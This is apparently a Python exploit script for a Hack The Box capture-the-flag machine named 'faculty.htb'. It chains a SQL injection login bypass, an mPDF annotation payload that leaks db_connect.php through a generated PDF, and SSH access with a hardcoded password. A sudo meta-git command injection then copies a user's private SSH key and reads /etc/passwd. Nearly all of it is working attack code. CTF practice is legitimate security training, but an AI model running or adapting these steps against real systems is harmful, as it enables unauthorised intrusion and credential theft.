from os import path
import os
import urllib.request
import requests
import sys
import re
import paramiko

ip = input("Enter Machine Ip: ")
cred = "' OR '1'='1"
payload = "<annotation file=\"./db_connect.php\" content=\"./db_connect.php\" icon=\"Graph\" title=\"Attached File: ./db_connect.php\" pos-x=\"195\" />"
sess = requests.session()

def loggin():
    global sess, cred
    print(f"[!] Add {ip} To Your '/etc/hosts' File")
    input("[*] Press Enter To Continue")
    postData = {
        "id_no" : cred
    }
    register = sess.post(f"http://faculty.htb/admin/ajax.php?action=login_faculty", data=postData)
    if 200 == register.status_code:
        print("[*] Login Successful")
    else:
        print("[!] Login Failed")
        sys.exit()

def sendPayload():
    global payload, sess
    payloadData = {
        "id" : " ",
        "course" : payload,
        "description" : payload
    }

    payloadSend = sess.post("http://faculty.htb/admin/ajax.php?action=save_course", data=payloadData)
    if 200 == payloadSend.status_code:
        print("[*] Payload Sent")
    else:
        print("[!] Payload Failed")
        sys.exit()

    data = sess.get("http://faculty.htb/admin/index.php?page=courses").text
    asd = re.search(r'value="(.*?)" />', data).group(1)
    if asd:
        print('[*] Generating PDF')
    else:
        print('[!] PDF Generation Failed')

    installData = {
        "pdf" : asd
    }
    name = sess.post("http://faculty.htb/admin/download.php", data=installData, allow_redirects=True)
    pdf = name.content.decode("utf-8")

    response = urllib.request.urlopen(f"http://faculty.htb/mpdf/tmp/{pdf}")
    file = open("result.pdf", "wb")
    file.write(response.read())
    print("[*] PDF Generated > result.pdf")
    print("[*] Take A Password From The PDF > ./result.pdf")
    file.close()

def popShell():
    global ip

    command = [
        "cd /tmp; echo 'Co.met06aci.dly53ro.per' | sudo -u developer --stdin meta-git clone 'asd||cat /home/developer/.ssh/id_rsa > /tmp/id_rsasda'",
        "cat /tmp/id_rsasda; cat /etc/passwd"
    ]
    host = ip
    port = 22
    username = "gbyolo"
    password = input("Enter Password: ")
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(hostname=host, username=username, password=password)
        for command in command:
            stdin, stdout, stderr = ssh.exec_command(command)
            print(stdout.read().decode())
            err = stderr.read().decode()
            if err:
                print(err)
    except:
        print("[!] Cannot connect to the SSH Server")
        exit()
        
if __name__ == "__main__":
    print("[*] Logging")
    loggin()
    print("[*] Sending Payload")
    sendPayload()
    print("[*] Poppin Shell")
    popShell()
    print("[*] Done")